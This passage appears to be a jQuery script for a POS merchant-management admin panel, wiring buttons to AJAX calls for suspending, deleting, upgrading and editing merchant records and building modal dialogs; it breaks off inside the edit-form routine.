  
$(document).ready(function(){
    
    //titlebar(0); 
    //return false;
    
    $("#posUsers").on("hidden", function() {
        $('#pos_user_list').html('');
    });    
    
    $('.merchant_pos_users').click(function(){
        
        var merchantId = this.id;
      
        $.ajax({
            type: "POST",
            url: "merchant_pos_user_ajax_request.php",
            data:'id='+merchantId,
            beforeSend: function(){
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	}); 
    });
    
    $('.merchant_pos_settings').click(function(){
        
        var merchantId  = this.id;
        var posVersion  = $(this).attr('pos_version');
       
        $.ajax({
            type: "POST",
            url: "merchant_pos_settings_ajax_request.php",
            data:'id='+merchantId+'&pos_version='+posVersion,
            beforeSend: function(){
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	}); 
    });
    
    
    $('.upgrade_sms_pack').click(function(){
        
         var merchantId = $(this).attr('smsid');
      
        $.ajax({
            type: "POST",
            url: "ajax_request/sms_upgrade.php",
            data:'id='+merchantId,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	});
        
    }); 
    
    $('.upgrade_package').click(function(){
         
         var merchantId     = $(this).attr('custid');
         var currentPackage = $(this).attr('cur_pack');
         var expiry_at = $(this).attr('expiry_at');
      
        $.ajax({
            type: "POST",
            url: "ajax_request/package_upgrade.php",
            data:'id='+merchantId+'&currentPackage='+currentPackage+'&expiry_at='+expiry_at,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	});
    }); 
    
    $('.merchantVerification').click(function(){
         
        var merchantId = $(this).attr('custid');
        var postData = 'action=authentication';
            postData = postData + '&id=' + merchantId;
            postData = postData + '&auth_type=setGenuineMerchant';
      
        $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data: postData,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	});
        
    }); 
        
    $('.merchantLog').click(function(){
         
        var merchantId = $(this).attr('custid');
        var postData = 'action=merchantLog';
            postData = postData + '&id=' + merchantId;
      
        $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data: postData,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	});
        
    }); 
        
    $('.merchant_details').click(function(){
        
         var merchantId = $(this).attr('mdbid');

        $.ajax({
            type: "POST",
            url: "ajax_request/merchants.php",
            data:'id='+merchantId,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
	});
        
    });
    $('.feedback_details').click(function(){
        $('.add_feedback').show();
        var merchantIds = this.id;
	var SpltId = merchantIds.split('_');
	var merchantId = SpltId[1];
        $.ajax({
            type: "POST",
            url: "ajax_request/merchants_feedback.php",
            data:'id='+merchantId,
            beforeSend: function(){                    
                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
            },
            success: function(data){			 
                $("#pos_user_list").html(data);			 
            }
		});
        
    });
    $('.merchant_delete').click(function(){

        if(confirm('Are you sure to delete the merchant record.')) {
           var merchantId = $(this).attr('mid');
           
           var  htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'>Please confirm to delete merchant record?</div>";
                htmltext = htmltext + '<div style="text-align:center;"><button type="button"  onclick="trashMerchant(' + merchantId + ');" id="btn_trash_merchant" class="btn btn-danger" >Yes</button> <button type="button" class="btn btn-success" data-dismiss="modal">No</button></div></div>'
           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    });
    
    $('.check_pos_version').click(function(){
        
        var merchantId = $(this).attr('mid'); 
        
        checkPosVersion(merchantId);
    });
    
    $('.extend_demo').click(function(){

        if(confirm('Are you sure to change the POS expiry date?')) {
           var merchantId = $(this).attr('extid');
           
            var htmltext = "<div style='padding:50px;' class='row'><div id='display_msg'></div>";
                htmltext = htmltext + '<div id="model_form" class=" col-sm-6 col-sm-offset-3 text-center"><h2>Change POS Expiry Date</h2><div class="form-group">';
                htmltext = htmltext + '<label>Select New Expiry Date:</label>';
                htmltext = htmltext + '<div class="input-group date">';
                htmltext = htmltext + '<div class="input-group-addon">';
                htmltext = htmltext + '<i class="fa fa-calendar"></i>';
                htmltext = htmltext + '</div>';
                htmltext = htmltext + '<input class="form-control pull-right" onkeyDown="return false;" id="new_expiry_date" type="text">';
                htmltext = htmltext + '</div></div>';                
                htmltext = htmltext + '<div class="col-sm-12" style="text-align:center; margin-top:20px;"><button type="button" onclick="changePosExpiryDate(' + merchantId + ');" id="btn_extend_demo" class="btn btn-success" >Change Date</button> <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button></div></div>';
                htmltext = htmltext + '<script>$("#new_expiry_date").datepicker({ autoclose: true }); <\/script><div>';
                           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    });
    
    $('.suspend_pos').click(function(){

        if(confirm('Are you sure to suspend the merchant POS.')) {
           var merchantId = $(this).attr('mid');
           
            var htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'>Please confirm to suspend merchant POS?</div>";
                htmltext = htmltext + '<div style="text-align:center;"><button type="button" onclick="suspendPOS(' + merchantId + ');" id="btn_trash_merchant" class="btn btn-danger" >Yes</button> <button type="button" class="btn btn-success" data-dismiss="modal">No</button></div></div>'
           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    }); 
    
    $('.unsuspend_pos').click(function(){

        if(confirm('Are you sure to unsuspend the merchant POS.')) {
           var merchantId = $(this).attr('mid');
           
            var htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'>Please confirm to unsuspend merchant POS?</div>";
                htmltext = htmltext + '<div style="text-align:center;"><button type="button" onclick="unsuspendPOS(' + merchantId + ');" id="btn_trash_merchant" class="btn btn-danger" >Yes</button> <button type="button" class="btn btn-success" data-dismiss="modal">No</button></div></div>'
           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    });     
    
    $('.merchant_edit').click(function(){
        
//        var merchantId = $(this).attr('eid');
//        var postData = 'action=editMerchant&id='+merchantId;
// 
//        $.ajax({
//            type: "POST",
//            url: "ajax_request/merchant_actions.php",
//            data:postData,
//            beforeSend: function(){                    
//                $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
//            },
//            success: function(data){
//                 
//                $("#pos_user_list").html(data);			 
//            }
//        });
 
        
    }); 
    
    $('.change_distributor').click(function(){
        
          if(confirm('Are you sure to change distributor.')) {
              
           var merchantId = $(this).attr('mid');
           
           var  htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'>Please confirm to change distributor of selected merchant.</div>";
                htmltext = htmltext + '<div style="text-align:center;"><button type="button" onclick="changeDistributor(' + merchantId + ');" id="btn_change_distributor" class="btn btn-success" >Change Distributor</button> <button type="button" class="btn btn-danger" data-dismiss="modal">No Thanks</button></div></div>'
           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    }); 
    
    
    
    $('.merchant_undelete').click(function(){

        if(confirm('Are you sure to undelete the merchant record.')) {
           var merchantId = $(this).attr('umid');
           
           var  htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'>Please confirm to undelete merchant record?</div>";
                htmltext = htmltext + '<div style="text-align:center;"><button type="button" onclick="trashUnduMerchant(' + merchantId + ');" id="btn_trash_merchant" class="btn btn-danger" >Yes</button> <button type="button" class="btn btn-success" data-dismiss="modal">No</button></div></div>'
           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    }); 
   
    
    $('.merchant_reset').click(function(){

        if(confirm('Are you sure to reset the merchant data.')) {
           var merchantId = $(this).attr('resetmid');
           
           var  htmltext = "<div style='padding:50px;' class='row'><div class='alert alert-info'>Please confirm to reset merchant information?</div>";
                htmltext = htmltext + '<div style="text-align:center;"><button type="button" onclick="resetMerchant(' + merchantId + ');" id="btn_reset_merchant" class="btn btn-danger" >Yes</button> <button type="button" class="btn btn-success" data-dismiss="modal">No</button></div></div>'
           
            $("#pos_user_list").html(htmltext);
           
        } else {
            return false;
        }
        
    }); 
   
    $('.merchant_remove').click(function(){

        if(confirm('Are you sure to delete the POS permanently.')) {
            
           // window.location = 'merchants.php?action=destroyMerchant&id=' + id;
           
            var merchantId = $(this).attr('pmid');
            var postData = 'action=authentication&id='+merchantId;
            
            $.ajax({
                type: "POST",
                url: "ajax_request/merchant_actions.php",
                data:postData,
                beforeSend: function(){                    
                    $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
                },
                success: function(data){			 
                    $("#pos_user_list").html(data);			 
                }
            });
           
        } else {
            return false;
        }
        
    });
    
    $('#per_page_records').change(function(){
             
        requestMerchantsList(1);
    });
    
    $('#btn_search').click(function(){
      
        var searchKey = $('#search_key').val();
         
         if(searchKey != '') {
               $('#result_type').val('search');
               requestMerchantsList(1);
         } 
    });    
//    $('#btn_search').click(function(){
//      
//        var searchKey = $('#search_key').val();
//         
//         if(searchKey != '') {
//               $('#result_type').val('search');
//               viewDataList(1);
//         } 
//
//    });
    
    $('.merchant_status').click(function(){
           // alert('cc');
         var merchantId = $(this).attr('id');
         
          // var merchantId = $('input.active_status').attr('id');
           var status = $('#active_status_'+merchantId).val();
           
           var newStatus = (status==1) ? 0 : 1;

           $.ajax({
                    type: "POST",
                    url: "ajax_request/merchant_actions.php",
                    data:'action=changeStatus&id='+merchantId+'&newStatus='+newStatus,	
                    beforeSend: function() {
                        $('.merchant_status_'+merchantId).removeClass('btn-success');
                        $('.merchant_status_'+merchantId).removeClass('btn-default');
                        $('.merchant_status_'+merchantId).addClass('btn-info');  
                        $('.merchant_status_'+merchantId).html("<i class='fa fa-refresh fa-spin'></i> Updating");
                    },
                    success: function(jsonData){ 

                        var obj = $.parseJSON(jsonData);
                       // console.log(obj);
                        if(obj.status=='ERROR'){				
                            alert(obj.msg);				
                        }

                        if(obj.status=='SUCCESS'){
                            
                          setTimeout(function(){  
                            
                                $('#active_status_'+merchantId).val(newStatus);
                                if(newStatus == 1){ 
                                    $('.merchant_status_'+merchantId).removeClass('btn-info');
                                    $('.merchant_status_'+merchantId).addClass('btn-success');                              
                                    $('.merchant_status_'+merchantId).html("<i class='fa fa-check-circle-o'></i> Active ");             

                                } else {
                                    $('.merchant_status_'+merchantId).removeClass('btn-info');
                                    $('.merchant_status_'+merchantId).addClass('btn-default');
                                    $('.merchant_status_'+merchantId).html("<i class='fa fa-ban'></i> Deactive ");

                                }
                           
                           }, 1000);
                        }                  
                    }
            });

        }); 
     
    $('.pos_updates_available').click(function(){

        if(confirm('Are you sure to update pos new version?')) {
           
            var merchantId = $(this).attr('mid');
            var currentVersion = $('#merchant_pos_version_'+merchantId).val();
            var projectGroup  = $('#project_group_'+merchantId).val();
            
            var postData = 'action=authentication';
                postData = postData + '&auth_type=pos_updates';
                postData = postData + '&id='+merchantId;
                postData = postData + '&project_group='+projectGroup;
            
            $.ajax({
                type: "POST",
                url: "ajax_request/merchant_actions.php",
                data:postData,
                beforeSend: function(){                    
                    $("#pos_user_list").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i></div>");                    
                },
                success: function(data){			 
                    $("#pos_user_list").html(data);			 
                }
            });
           
        } else {
            return false;
        }
        
    });    
    
    $('.uptodate_version').click(function(){  
            
            var merchantId = $(this).attr('mid');
            var currentVersion = $('#merchant_pos_version_'+merchantId).val();
            
            var display_msg = 'POS version '+currentVersion+' is updated.';
            var model_title = 'POS Versions Apply';
            var btn =   '<button type="button" onclick="fixedCurrentVersion(' + merchantId + ');" id="btn_restore_pos_backup" class="btn btn-info">Fixed This Version</button>';
            btn = btn + '<button type="button" onclick="restorePosBackup(' + merchantId + ');" id="btn_restore_pos_backup" class="btn btn-danger">Restore Previous Version</button>';
            btn = btn + '<button type="button" class="btn btn-success" data-dismiss="modal">No Thanks</button>';
                    
             var data =  '<div class="modal-content">\n\
                            <div class="modal-header"> \n\
                                <button type="button" class="close" data-dismiss="modal">�</button> \n\
                                <h4 class="modal-title" id="modal_title">'+model_title+'</h4>\n\
                            </div> \n\
                            <div class="modal-body col-sm-8 col-sm-offset-2 col-xs-12"> \n\
                                <div id="display_msg" class="alert alert-success">'+display_msg+'</div>\n\
                            </div> \n\
                            <div class="modal-footer border-muted"> \n\
                                <div class="col-sm-12 col-xs-12 text-center" id="module_button">'+btn+'</div>\n\
                            </div> \n\
                        </div>';
           
            $("#pos_user_list").html(data);
    });
    
    
    //Action Change Status Record
    $('.action-change-status').click(function(){
        
        var changeIcon = '';
        var statusTitle = '';
        
        var MasterData = getPageMasterInfo(); 
        
        var Id = $(this).attr('keyid');
        var Status = $(this).attr('keystatus');        
        
        var newStatusValue = (Status == 1) ? 0 : 1;
        
        var postData = 'action=changeStatus';
            postData = postData + '&table=' + MasterData['MasterTable'];
            postData = postData + '&id_filed=' + MasterData['IdFiled'];
            postData = postData + '&library=' + MasterData['ClassLibrary'];
            postData = postData + '&id=' + Id;
            postData = postData + '&newStatus=' + newStatusValue;
         
         $.ajax({
                type: "POST",
                url: "ajax_request/data_actions.php",
                data: postData,	
                beforeSend: function() {                    
                    $('#acs_id_'+Id).html('<i class="fa fa-refresh fa-spin text-info" ></i>');
                },
                success: function(jsonData){ 
                    
                       var obj = $.parseJSON(jsonData);
                          
                        if(obj.status=='ERROR'){                            
                            
                            setTimeout(function(){
                                
                                $('#error_msg').html('<div class="alert alert-danger">'+obj.msg+'</div>'); 
                                
                                if(Status == 1) {
                                    changeIcon = '<i class="fa fa-check-square-o text-success" ></i>';
                                } else { 
                                    changeIcon ='<i class="fa fa-ban text-danger" ></i>';
                                }
                                
                                $('#acs_id_'+Id).html(changeIcon);   
                                $('#acs_id_'+Id).addClass('has-error');   
                           
                           }, 1000);
                        }

                        if(obj.status=='SUCCESS')
                        {
                           $('#error_msg').html(''); 
                           
                            setTimeout(function(){
                                
                                if(newStatusValue == 1) {
                                    changeIcon = '<i class="fa fa-check-square-o text-success" ></i>';
                                    statusTitle = 'Status Active';
                                    $('#datarow-' + Id).removeClass('row-deactive');
                                } else { 
                                    changeIcon ='<i class="fa fa-ban text-danger" ></i>';
                                    statusTitle = 'Status Deactive';
                                    $('#datarow-' + Id).addClass('row-deactive');
                                }
                                
                                $('#acs_id_'+Id).html(changeIcon);    
                                $('#acs_id_'+Id).attr('keystatus', newStatusValue);    
                                $('#acs_id_'+Id).attr('title', statusTitle);    
                                $('#acs_id_'+Id).addClass('has-success');
                           }, 1000);
                        }                  
                }
            });
        
        
    });
    //Action Change Status Record
        
    //Action Delete Record
    $('.action-delete').click(function(){ 
        
        var MasterData = getPageMasterInfo(); 
        
        var Id = $(this).attr('keyid'); 
        
        var postData = 'action=trash';
            postData = postData + '&table=' + MasterData['MasterTable'];
            postData = postData + '&id_filed=' + MasterData['IdFiled'];
            postData = postData + '&library=' + MasterData['ClassLibrary'];
            postData = postData + '&id=' + Id;
       
        $.ajax({
                type: "POST",
                url: "ajax_request/data_actions.php",
                data: postData,	
                beforeSend: function() {                    
                    $('.action-' + Id).hide();
                    $('#data-action-'+ Id +' .loading').html('<i class="fa fa-refresh fa-spin text-danger" ></i>');
                },
                success: function(jsonData){ 
                    
                    var obj = $.parseJSON(jsonData);
                          
                    if(obj.status=='ERROR'){                            

                        setTimeout(function(){                                
                            $('#error_msg').html('<div class="alert alert-danger">'+obj.msg+'</div>'); 
                            $('#data-action-'+Id +' .loading').html('');
                            $('.action-' + Id).show();

                       }, 1000);
                    }
                    if(obj.status=='SUCCESS')
                    {
                       $('#error_msg').html(''); 

                        setTimeout(function(){
                            $('#data-action-'+Id +' .loading').html('');
                            $('#datarow-' + Id).addClass('row-deleted');
                            $('.action-' + Id).hide();
                            $('.recycle-' + Id).show();

                       }, 1000);
                    }                  
                }
            });
        
    });
    //End Action Delete Record
    
    
    //Action Delete Record
    $('.action-undelete').click(function(){
        
        var MasterData = getPageMasterInfo(); 
        
        var Id = $(this).attr('keyid'); 
        
        var postData = 'action=untrash';
            postData = postData + '&table=' + MasterData['MasterTable'];
            postData = postData + '&id_filed=' + MasterData['IdFiled'];
            postData = postData + '&library=' + MasterData['ClassLibrary'];
            postData = postData + '&id=' + Id;
       
        $.ajax({
                type: "POST",
                url: "ajax_request/data_actions.php",
                data: postData,	
                beforeSend: function() {                    
                    $('.recycle-' + Id).hide();
                    $('#data-action-'+ Id +' .loading').html('<i class="fa fa-refresh fa-spin text-danger" ></i>');
                },
                success: function(jsonData){ 
                    
                    var obj = $.parseJSON(jsonData);
                          
                    if(obj.status=='ERROR'){                            

                        setTimeout(function(){                                
                            $('#error_msg').html('<div class="alert alert-danger">'+obj.msg+'</div>'); 
                            $('#data-action-'+Id +' .loading').html('');
                            $('.recycle-' + Id).show();
                       }, 1000);
                    }
                    if(obj.status=='SUCCESS')
                    {
                       $('#error_msg').html(''); 

                        setTimeout(function(){
                            $('#data-action-'+Id +' .loading').html('');
                            $('#datarow-' + Id).removeClass('row-deleted');
                            $('.action-' + Id).show();
                            $('.recycle-' + Id).hide();

                       }, 1000);
                    }                  
                }
            });
        
    });
    //End Action Delete Record

    //Action Edit Record
    $('#btnAddNew').click(function(){
        
        $('.model-form').show();
        $('#myModalSubmit').show();
        $('input.form-control').val('');
        $('.hide-update').show();
        $('#action_msg').html('');
        
       $('#formAction').val('insert'); 
       $('#myModalTitle').html('Add New Record'); 
        
    });
    //End Action Edit Record
       
    //Action Edit Record
    $('.action-edit').click(function(){
        
        $('.model-form').show();
        $('#myModalSubmit').show();
        $('.hide-update').hide();
        $('#action_msg').html('');
        
        var MasterData = getPageMasterInfo(); 
       
       var Id = $(this).attr('keyid');
     
       $('#formAction').val('edit');
       $('#update_id').val(Id);
       
        var postData = 'action=get_record';            
            postData = postData + '&library=' + MasterData['ClassLibrary'];
            postData = postData + '&id=' + Id;
           
        $.ajax({
                type: "POST",
                url: "ajax_request/data_actions.php",
                data: postData,
                success: function(jsonData){
                    
                    var obj = $.parseJSON(jsonData);
                    
                    set_edit_form( obj , MasterData['ClassLibrary'] );               
                }
            });
        
    });
    //End Action Edit Record
    
    $('ul.sort_by li').click(function(){

          var sortBySelected = $(this).children('a').html();
          var sortBy = $(this).attr('id');

          $('#show_sort_by').html(sortBySelected);
          
          $('#record_sort_by').val(sortBy);
          $('#result_type').val('filter');
          
          viewDataList(1);

    });
        
    $('#per_page_records').change(function(){
             
        viewDataList(1);
    });
        
      
         
    $('#myModalClose').click(function(){
    
         var MasterData = getPageMasterInfo();
    
        reset_model_form(MasterData['ClassLibrary']);
        
        
    });
    
    $('#myModalContent .close').click(function(){
       
         var MasterData = getPageMasterInfo();
    
        reset_model_form(MasterData['ClassLibrary']);
        
        
    });
   
    $('.send_request').click(function(){  
             
            var merchant_id  = $(this).attr('mid');
            var request_type = $(this).attr('req');
            var request_name = '';
            var model_title = 'Send Request';
            var postData = 'action=merchantShortInfo';
                postData = postData + '&id=' + merchant_id;
                postData = postData + '&request_type=' + request_type;
           
        $("#pos_user_list").html('<div class="alert alert-info"><i class="fa fa-refresh fa-spin text-danger" ></i> Loading....</div>');
        
        $.ajax({
            type: "POST",
            url: "ajax_request/merchant_actions.php",
            data: postData,
            success: function(jsonData){ 
                    
                var obj = $.parseJSON(jsonData);
               
                if(obj.status=='SUCCESS')
                {                        
                    switch(request_type) {
                        
                        case 'GENERATE_POS':
                            request_name = " Generate POS";
                            model_title = "Generate POS Request";
                            break;
                        case 'SOFT_DELETE':
                            request_name = "Merchant Soft Delete";
                            model_title = "Merchant Soft Delete Request";
                            break;
                        case 'ADD_SMS':
                            request_name = "Recharge SMS Package";
                            model_title = "Upgread SMS Package Request";
                            break;
                        case 'UPGRADE_PACKAGE':
                            request_name = "Upgrade Package";
                            model_title = "Upgrade Subscription Request";
                            break;
                        case 'UNDO_SUSPEND':
                            request_name = "Unsuspend Merchant";
                            model_title = "Cancle Suspention Request";
                            break;
                        case 'SUSPEND_POS':
                            request_name = "Suspend POS";
                            model_title = "Merchant Suspention Request";
                            break;
                        case 'UNDO_DELETE':
                            request_name = "Undelete Merchant";
                            model_title = "Cancle Delete Merchant Request";
                            break;
                        case 'DELETE_PERMANANTALY':
                            request_name = "Merchant Permanently Delete";
                            model_title = "Merchant Permanently Delete Request";
                            break;
                        case 'EXTEND_EXPIRY':
                            request_name = "Extend POS Expiry Date";
                            model_title = "POS Expiry Date Extend Request";
                            break;
                        case 'UPDATE_VERSION':
                            request_name = "Update POS Latest Version";
                            model_title = "POS Latest Version Update Request";
                            break;
                    }//end switch.            
                     var btn ='';
                     var display_msg ='';
                     var formdata ='';
                   
                    if(obj.request.status == true) {
                        
                        display_msg =  request_name+' request already send.';
                         
                        btn = btn + '<button type="button" class="btn btn-danger" data-dismiss="modal"> <i class="fa fa-fw fa-close"></i> Close </button>';
                        
                        
                        formdata = formdata + '<div><h2>Request Details</h2><table class="table">\n\
                                            <tr><th>Request Date</th><td>'+obj.request.request_at+'</td><th>Status</th><td>'+obj.request.request_status+'</td></tr>\n\
                                            <tr><th>Comment</th><td colspan="3">'+obj.request.distributor_comments+'</td>\n\
                                        </table></div>';
                    }  else {
                        
                        display_msg = 'Do you really want to send request for "'+request_name+'"?';
                        
                        btn = btn + '<button type="button" onclick="submit_request()" class="btn btn-success"> <i class="fa fa-fw fa-send"></i> Send Request</button>';
                        btn = btn + '<button type="button" class="btn btn-danger" data-dismiss="modal"> <i class="fa fa-fw fa-close"></i> No Thanks</button>';
                        btn = btn + '<input type="hidden" id="request_type" value="'+request_type+'" />';
                        btn = btn + '<input type="hidden" id="merchant_id" value="'+merchant_id+'" />';
                        
                        formdata = formdata + '<div class="comment"><h4>Comments:</h4><div><textarea rows="6" class="form-control" id="request_comments" /></div></div>'
                    }
                    
 
                     var data =  '<div class="modal-content">\n\
                                    <div class="modal-header"> \n\
                                        <button type="button" class="close" data-dismiss="modal">�</button> \n\
                                        <h4 class="modal-title" id="modal_title">'+model_title+'</h4>\n\
                                    </div> \n\
                                    <div class="modal-body col-sm-8 col-sm-offset-2 col-xs-12"> \n\
                                        <div id="display_request_msg" class="alert alert-info">'+display_msg+'</div>\n\
                                        <div><h2>Merchant Details</h2><table class="table">\n\
                                            <tr><th>Merchant Name</th><td>'+obj.name+'</td><th>Type</th><td>'+obj.type_name+'</td></tr>\n\
                                            <tr><th>Pos Name</th><td>'+obj.pos_name+'</td><th>Status</th><td>'+obj.pos_status+'</td></tr>\n\
                                        </table></div>\n\
                                        '+formdata+'\n\
                                    </div> \n\
                                    <div class="modal-footer border-muted"> \n\
                                        <div class="col-sm-12 col-xs-12 text-center" id="module_button" style="padding:30px 0;">'+btn+'</div>\n\
                                    </div> \n\
                                </div>';

                        $("#pos_user_list").html(data);
                }                  
            }
        });
    });
    
});
  

function submit_request(){
    
     var merchant_id = $('#merchant_id').val();
     var request_type = $('#request_type').val();
     var comments = $('#request_comments').val();
        
         var postData = 'action=submitDistributorsRequest';
             postData = postData + '&id=' + merchant_id;
             postData = postData + '&type=' + request_type;
             postData = postData + '&comment=' + comments;
        
         $.ajax({
                type: "POST",
                url: "ajax_request/merchant_actions.php",
                data: postData,	
                beforeSend: function() {                    
                    $('#display_request_msg').html('<i class="fa fa-refresh fa-spin text-info" ></i> Request Sending...');
                },
                success: function(jsonData){ 
                    
                       var obj = $.parseJSON(jsonData);

                        if(obj.status=='SUCCESS')
                        {
                           var closebtn =  '<button type="button" class="btn btn-danger" data-dismiss="modal"> <i class="fa fa-fw fa-close"></i> Close </button>';
                                                    
                            setTimeout(function(){
                                $('#module_button').html(closebtn);
                                $('.comment').html('');
                                $('#display_request_msg').removeClass('alert-info');
                                $('#display_request_msg').addClass('alert-success');
                                $('#display_request_msg').html('Congratulation! Your request successfully send to admin. <br/>Your Request Id: #'+obj.request_id);
                                
                           }, 3000);
                        }                  
                }
            });
    
}

function reset_model_form(Library)
{
    switch(Library){
        
        case 'merchant_type':
            
            $('#merchant_type').val('');
                
            var inMobile = 0;
            var inWeb = 1;
            var genPos = 1;

            $("input[name=show_in_mobile][value=" + inMobile + "]").prop('checked', true);
            $("input[name=show_in_web][value=" + inWeb + "]").prop('checked', true);
            $("input[name=generate_pos][value=" + genPos + "]").prop('checked', true);
            
            $("#form-control-pos-project").show();
            $("#form-control-pos-sample-data").show();
                
            $("#pos_project").val(1);
            $("#pos_sample_data").val(1);
            
        break;        
        
        case 'pos_project_zip':
            
            $('#title').val('');
            $('#version').val('');
            $('#project_file').val('');
            
            
        break;
        
        case 'pos_project_sql':
            
            $('#title').val('');
            $('#version').val('');
            $('#database_file').val('');
            $('#images_zip_file').val('');

        break;
        
        case 'pos_versions':
            
            $("#version").val('');
            $('#relese_status').val('');       
            $("#relese_type").val('alpha');
            $("#upgread_sql").val('0');
            $("#project_code_path").val('');
            $("#sql_file_path_up").val('');
            $("#sql_file_path_down").val('');
            $("#update_log_file_path").val('');

            $("#sql_file_path_up").attr('disabled', 'disabled');
            $("#sql_file_path_down").attr('disabled', 'disabled');
            $('.sql_file_field').hide();

        break;
        
    }//end switch.
    
    
    $("#formAction").val('');
    $("#update_id").val('');
    $('#action_msg').html('');
    
}

function set_edit_form(obj , Library )
{
    
    switch(Library)
    {        
        case 'merchant_type':
            
            $('#merchant_type').val(obj.merchant_type);
                
            var inMobile = (obj.show_in_mobile == 'Yes') ? 1 : 0;
            var inWeb = (obj.show_in_web == 'Yes') ? 1 : 0;
            var genPos = (obj.generate_pos == 'Yes') ? 1 : 0;

            $("input[name=show_in_mobile][value=" + inMobile + "]").prop('checked', true);
            $("input[name=show_in_web][value=" + inWeb + "]").prop('checked', true);
            $("input[name=generate_pos][value=" + genPos + "]").prop('checked', true);
            
            if(genPos == 1) {
                $("#pos_project").val(obj.pos_project_id);
                $("#pos_sample_data").val(obj.pos_sample_data_id);
            } else {
                $("#form-control-pos-project").hide();
                $("#form-control-pos-sample-data").hide();
            }

        break;
        
        case 'merchant':
            var SelectCountry = obj.country +'~'+ obj.country_code;
            $('.form-input').val('');
            //$('.input-radio').removeAttr('checked');
            
            $('#name').val(obj.name);
            $('#email').val(obj.email);
            $('#phone').val(obj.phone);            
            $('#country').val(SelectCountry);
            $('#merchant_type').val(obj.type);
            $('#business_name').val(obj.business_name);
            $('#pos_generate').val(obj.pos_generate);
            $('#pos_status').val(obj.pos_status);
            
            $('#phone').attr('readonly' , 'readonly');
            
            if(obj.pos_generate == 1){                
                $('#pos_name').attr('disabled' , 'disabled');
                $('#merchant_type').attr('disabled' , 'disabled');
                $('#pos_web_url').hide();
            } else { 
                
                $('#pos_name').val(obj.pos_name);
                $('#pos_web_url').show();
                $('#pos_name').removeAttr('disabled');
                $('#merchant_type').removeAttr('disabled');
            }
            
            $('#address').val(obj.address);
            $('#state').val(obj.state);
            $('#city').val(obj.city);
            
            $('#project_id').val(obj.project_id);
            $('#merchant_group').val(obj.merchant_group);
            $('#distributor_id').val(obj.distributor_id);
            $('#client_by').val(obj.client_by);
            
            $('#is_testing_merchant').val(obj.is_testing_merchant);
            $('#restricted_pos_updates').val(obj.restricted_pos_updates);
            
        break;
            
        case 'pos_project_zip':
            
            $('#project_group').val(obj.project_group);
            $('#title').val(obj.title);
            $('#version').val(obj.version);
            $('#project_file').val(obj.project_file);

        break;
        
        case 'pos_project_sql':
            
            $('#title').val(obj.title);
            $('#version').val(obj.version);
            $('#sample_data_file').val(obj.sample_data_file);
            $('#database_file').val(obj.database_file);
            $('#images_zip_file').val(obj.images_zip_file);

        break;
        
        case 'pos_versions':
            
            $("#project_id").val(obj.project_id);
            $("#version").val(obj.version);
            $('#relese_status').val(obj.relese_status);       
            $("#relese_type").val(obj.relese_type);
            $("#upgread_sql").val(obj.upgread_sql);
            $("#project_code_path").val(obj.project_code_path);            
            $("#update_log_file_path").val(obj.update_log_file_path);
            
            if(obj.upgread_sql == 1) 
            {
                $("#sql_file_path_up").removeAttr('disabled');
                $("#sql_file_path_down").removeAttr('disabled');
                $('.sql_file_field').show();
                $("#sql_file_path_up").val(obj.sql_file_path_up);
                $("#sql_file_path_down").val(obj.sql_file_path_down);
            } else {
                $("#sql_file_path_up").attr('disabled', 'disabled');
                $("#sql_file_path_down").attr('disabled', 'disabled');
                $('.sql_file_field').hide();
            }
        break;
        
        case 'distributors': 
                
                $('#update_id').val(obj.id);
                $('#is_disrtibuter').val(obj.is_disrtibuter);
                $('#display_name').val(obj.name);
                $('#email_id').val(obj.email_id);
                $('#mobile_no').val(obj.mobile_no); 
            
            break;
            
        case 'adminUser':
             
                $('#update_id').val(obj.id);
                $('#is_disrtibuter').val(obj.is_disrtibuter);
                $('#group_id').val(obj.group_id);
                $('#group').val(obj.group);
                $('#group_id').val(obj.group_id);
                $('#display_name').val(obj.display_name);
                $('#email_id').val(obj.email_id);
                $('#mobile_no').val(obj.mobile_no);
              
            break;
            
        case 'distributors_request':
            
            jQuery.each( obj, function( key, val ) {
                
                if($( "td" ).hasClass( key )){                    
                    $('.'+key).html(val);
                }
                
              });
             
            $('#myModalTitle').html('Request For: '+obj.request_type);
            $('#request_status').val(obj.request_status);
